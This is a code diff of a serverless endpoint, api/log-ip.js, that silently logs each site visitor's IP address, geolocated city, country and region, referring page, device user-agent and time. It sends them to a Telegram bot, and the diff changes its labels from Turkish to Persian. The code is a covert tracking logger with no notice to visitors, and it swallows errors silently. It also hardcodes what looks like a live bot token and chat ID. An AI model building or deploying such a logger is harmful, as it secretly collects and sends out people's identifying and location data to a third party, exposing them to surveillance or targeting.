@@ -1,67 +1,38 @@
 // api/log-ip.js
-// Federasyonlar IP Logger - Optimized for Real City + Country
-
 export default async function handler(req, res) {
   try {
-    // Get IP Address (Best method for Vercel)
-    let ip = req.headers['x-forwarded-for']
+    const ip = req.headers['x-forwarded-for']
       ? req.headers['x-forwarded-for'].split(',')[0].trim()
-      : req.headers['x-real-ip']
-      || req.socket?.remoteAddress
-      || 'Bilinmiyor';
+      : req.headers['x-real-ip'] || 'نامشخص';
 
-    // Remove IPv6 prefix if present
-    if (ip.startsWith('::ffff:')) {
-      ip = ip.replace('::ffff:', '');
-    }
-
-    const userAgent = req.headers['user-agent'] || 'Bilinmiyor';
-    const pageURL = req.headers.referer || req.headers.origin || 'Doğrudan Erişim';
-    const timestamp = new Date().toLocaleString('tr-TR');
-
-    // Get accurate location data
-    let country = "Bilinmiyor";
-    let city = "Bilinmiyor";
-    let region = "Bilinmiyor";
+    let city = "نامشخص";
+    let country = "نامشخص";
+    let region = "نامشخص";
 
     try {
-      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
-        headers: { 'User-Agent': 'Federasyonlar-IP-Logger' }
-      });
-
+      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
       if (geoRes.ok) {
         const geo = await geoRes.json();
-        country = geo.country_name || geo.country || "Bilinmiyor";
-        city = geo.city || "Bilinmiyor";
-        region = geo.region || geo.region_code || "Bilinmiyor";
+        city = geo.city || "نامشخص";
+        country = geo.country_name || geo.country || "نامشخص";
+        region = geo.region || "نامشخص";
       }
-    } catch (e) {
-      // Fallback: Try another free service
-      try {
-        const fallbackRes = await fetch(`https://freegeoip.app/json/${ip}`);
-        if (fallbackRes.ok) {
-          const geo = await fallbackRes.json();
-          country = geo.country_name || "Bilinmiyor";
-          city = geo.city || "Bilinmiyor";
-          region = geo.region_name || "Bilinmiyor";
-        }
-      } catch { }
-    }
+    } catch (e) { }
 
     const message = `
-🛡️ Yeni Ziyaretçi
+🔴 بازدیدکننده جدید (کد وارد شد)
 
-🌐 IP Adresi: ${ip}
-🇹🇷 Ülke: ${country}
-🏙️ Şehir: ${city}
-📍 Bölge: ${region}
-🔗 Sayfa: ${pageURL}
-📱 Cihaz: ${userAgent.substring(0, 100)}... 
-⏰ Zaman: ${timestamp}
+🌐 آدرس IP: ${ip}
+🇮🇷 کشور: ${country}
+🏙️ شهر: ${city}
+📍 منطقه: ${region}
+🔗 صفحه: ${req.headers.referer || 'مستقیم'}
+📱 دستگاه: ${req.headers['user-agent']?.substring(0, 100) || 'نامشخص'}
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
     `.trim();
 
-    const BOT_TOKEN = "8797755900:AAFZYIce4vrR5YMQAB0Khz4oaQng2iDfe8M";   // ← Buraya yaz
-    const CHAT_ID = "8437897670";     // ← Buraya yaz
+    const BOT_TOKEN = "8797755900:AAFZYIce4vrR5YMQAB0Khz4oaQng2iDfe8M";
+    const CHAT_ID = "8437897670";
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -74,9 +45,7 @@ export default async function handler(req, res) {
     });
 
     return res.status(200).json({ success: true });
-
-  } catch (error) {
-    // Silent fail
+  } catch (e) {
     return res.status(200).json({ success: false });
   }
 }
